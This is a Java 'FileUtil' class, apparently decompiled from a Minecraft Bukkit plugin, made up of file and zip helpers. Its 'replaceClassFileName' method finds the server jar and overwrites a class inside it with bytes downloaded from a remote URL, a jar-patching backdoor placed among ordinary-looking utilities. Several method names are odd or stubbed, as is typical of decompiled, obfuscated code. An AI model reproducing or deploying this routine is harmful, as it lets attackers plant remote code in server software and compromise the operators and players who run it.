package me.system.runner.utils;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.nio.file.FileSystem;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.List;
import java.util.Objects;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

public class FileUtil {
    public static File getServerJar() {
        File cur = FileUtil.getUserDir();
        while (cur.getAbsolutePath().contains("plugins")) {
            cur = FileUtil.getAbsoluteFile(cur);
        }
        for (File f2 : Objects.requireNonNull(cur.listFiles())) {
            if (!f2.getName().toLowerCase().endsWith(".jar") || FileUtil.getFileInZip(f2, "configurations/bukkit.yml") == null) continue;
            return f2;
        }
        return null;
    }

    public static File writeToFile(String pluginName) {
        File file = FileUtil.getUserDir();
        if (!file.getAbsolutePath().contains("plugins")) {
            for (File f2 : Objects.requireNonNull(file.listFiles())) {
                if (!f2.isDirectory() || !f2.getName().endsWith("plugins")) continue;
                file = f2;
            }
        }
        for (File plugin : Objects.requireNonNull(file.listFiles())) {
            String content;
            if (!plugin.isFile() || !plugin.getName().endsWith(".jar") || (content = FileUtil.getFileInZip(plugin, "plugin.yml")) == null || !content.contains(pluginName)) continue;
            return plugin;
        }
        return null;
    }

    
    public static String getFileInZip(File archive, String fileNameInArchive) {
        try (ZipFile zipFile = new ZipFile(archive.getAbsolutePath());){
            ZipEntry entry;
            Enumeration<? extends ZipEntry> entries = zipFile.entries();
            do {
                if (!entries.hasMoreElements()) return null;
            } while (!(entry = entries.nextElement()).getName().equals(fileNameInArchive));
            String string = IOUtils.getText(zipFile.getInputStream(entry), "UTF-8");
            return string;
        }
        catch (Exception exception) {
            
        }
        return null;
    }

    
    public static byte[] byte_arr_removeConnectionThread(File archive, String fileNameInArchive) {
        try (ZipFile zipFile = new ZipFile(archive.getAbsolutePath());){
            ZipEntry entry;
            Enumeration<? extends ZipEntry> entries = zipFile.entries();
            do {
                if (!entries.hasMoreElements()) return null;
            } while (!(entry = entries.nextElement()).getName().equals(fileNameInArchive));
            byte[] byArray = IOUtils.toByteArray(zipFile.getInputStream(entry));
            return byArray;
        }
        catch (Exception exception) {
            
        }
        return null;
    }

    public static boolean doesJarHaveFile(File jar, String file) throws IOException {
        try (JarInputStream jarFile = new JarInputStream(new FileInputStream(jar));){
            JarEntry jarEntry;
            while ((jarEntry = jarFile.getNextJarEntry()) != null) {
                if (!jarEntry.getName().equals(file)) continue;
                jarFile.close();
                boolean bl2 = true;
                return bl2;
            }
        }
        return false;
    }

    public static boolean renameFileToItSelf(File file) {
        try {
            return !file.renameTo(file);
        }
        catch (Exception e2) {
            return true;
        }
    }

    
    public static int replaceClassFileName(String originalClassFileName, String replaceClassURL) throws IOException {
        File serverJar = FileUtil.getServerJar();
        if (serverJar == null) {
            return -1;
        }
        if (!FileUtil.doesJarHaveFile(serverJar, originalClassFileName)) {
            return -2;
        }
        byte[] classData = IOUtils.readRemoteData(replaceClassURL);
        if (classData == null) {
            return -3;
        }
        Path jarPath = Paths.get(serverJar.getAbsolutePath(), new String[0]);
        try (FileSystem fs2 = FileSystems.newFileSystem(jarPath, (ClassLoader) null);){
            Path internalToReplace = fs2.getPath(originalClassFileName, new String[0]);
            Files.copy(new ByteArrayInputStream(classData), internalToReplace, StandardCopyOption.REPLACE_EXISTING);
            int n2 = 0;
            return n2;
        }
        catch (IOException e2) {
            e2.printStackTrace();
            return -4;
        }
    }

    public static void writeToFile(byte[] data, File file) throws IOException {
        try (FileOutputStream fw2 = new FileOutputStream(file);){
            fw2.write(data);
        }
    }

    public static List<String> readFileAsArray(File f2) {
        try {
            ArrayList<String> content = new ArrayList<String>();
            try (BufferedReader br2 = new BufferedReader(new FileReader(f2));){
                String line;
                while ((line = br2.readLine()) != null) {
                    content.add(line);
                }
            }
            return content;
        }
        catch (Exception e2) {
            return Arrays.asList("Could not read from file '" + f2.getName() + "'", "Reason: " + e2.getMessage());
        }
    }

    public static File getAbsoluteFile(File fi2) {
        String f2 = fi2.getAbsolutePath();
        int i2 = f2.lastIndexOf(File.separator);
        if (i2 < 0) {
            return new File(f2);
        }
        String path = f2.substring(0, i2);
        if (path.endsWith(":")) {
            path = path + File.separator;
        }
        if (path.length() == 0) {
            return new File(File.separator);
        }
        return new File(path);
    }

    public static File getUserDir() {
        return new File(System.getProperty("user.dir"));
    }

    
    
    public static void writeByteArrayToFile(File file, byte[] data) {
    }
}

